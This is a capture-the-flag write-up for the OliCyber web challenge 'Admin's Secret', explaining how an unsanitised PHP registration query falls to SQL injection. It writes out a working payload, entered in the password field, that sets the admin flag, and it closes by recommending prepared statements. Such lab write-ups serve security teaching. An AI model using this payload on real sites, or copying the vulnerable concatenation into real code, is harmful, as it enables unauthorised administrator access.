# Admin's Secret

**Competition:** OliCyber<br>
**Category:** Web<br>
**URL:** http://adminsecret.challs.olicyber.it

---

## Description

> I found this site where you can register, but only the administrator receives the most interesting information. Can you sneak in?

A site with login and registration. The goal is to register as an administrator to obtain the flag.

---

## Solution

### Step 1 — Code Analysis

The registration query is:
```php
$sql = "INSERT INTO users(username,password,admin) VALUES ('" . $username . "','" . $password . "',false);";
```

Which translates to:
```sql
INSERT INTO users(username,password,admin) VALUES ('username', 'password', false);
```

**Vulnerability:** The `$password` variable is directly concatenated without sanitization — **SQL Injection in the PASSWORD field!**

---

### Step 2 — Identifying the Vulnerability

The `admin` column is a boolean set to `false`. We can inject SQL into the password field to change it to `true`.

---

### Step 3 — Crafting the SQL Injection Payload

In the **PASSWORD** field (not the username!), enter:
```
mypass123',true)#
```

This transforms the query into:
```sql
INSERT INTO users(username,password,admin) VALUES ('username1230x','mypass123',true)#',false);
```

**Explanation:**
- `mypass123',true)` — closes the values list and sets `admin = true`
- `#` — SQL comment (MySQL/MariaDB) that discards the rest of the original query

**Note:** We use `#` instead of `--` because in MariaDB, `--` followed by a comma causes syntax errors.

---

### Step 4 — Running the Exploit

1. Visit `http://adminsecret.challs.olicyber.it/register.php`
2. In the **Username** field, enter any username:
   ```
   admin
   ```
3. In the **Password** field, enter the payload:
   ```
   mypass123',true)#
   ```
4. Click **Register**

The system will register you as an admin user.

---

### Step 5 — Login as Admin

Now log in with:
1. Visit `http://adminsecret.challs.olicyber.it/login.php`
2. **Username:** `admin`
3. **Password:** `mypass123`
4. Click **Login**

The flag will appear in a blue alert box.

---

### Step 6 — Automated Exploit Script

See [exploit.py](exploit.py) for the full automated exploit.

```bash
python3 adminsecret.py
```

---

## Vulnerability Summary

| Aspect | Detail |
|---|---|
| **Type** | SQL Injection (SQLi) in the registration password field |
| **Cause** | Direct string concatenation of user input into SQL query without sanitization |
| **Vector** | Injecting `mypass123',true)#` into the password field |
| **Impact** | Creation of an admin account and unauthorized access |

---

### Why It Works

The original query:
```sql
INSERT INTO users(username,password,admin) VALUES ('USERNAME','PASSWORD',false);
```

With the payload `mypass123',true)#` in the password field:
```sql
INSERT INTO users(username,password,admin) VALUES ('username1230x','mypass123',true)#',false);
```

The `#` comments out the rest of the query, so:
- A user is created with the chosen username
- The password is set to `mypass123`
- `admin` is set to `true`
- The rest of the original query is ignored

**Important note:** The injection must go in the password field, not the username field. We use `#` instead of `--` because `--` does not work correctly in MariaDB when followed by a comma.

---

## Conclusions

This challenge demonstrates that:

1. **SQL Injection is still critical**: Concatenating variables directly into SQL is extremely dangerous.
2. **Every input field is a potential attack vector**: Not just login fields, registration forms too.
3. **Prepared statements are the solution**: They are the standard fix to prevent SQLi.
4. **Admin access is the target**: Whoever controls the admin controls everything.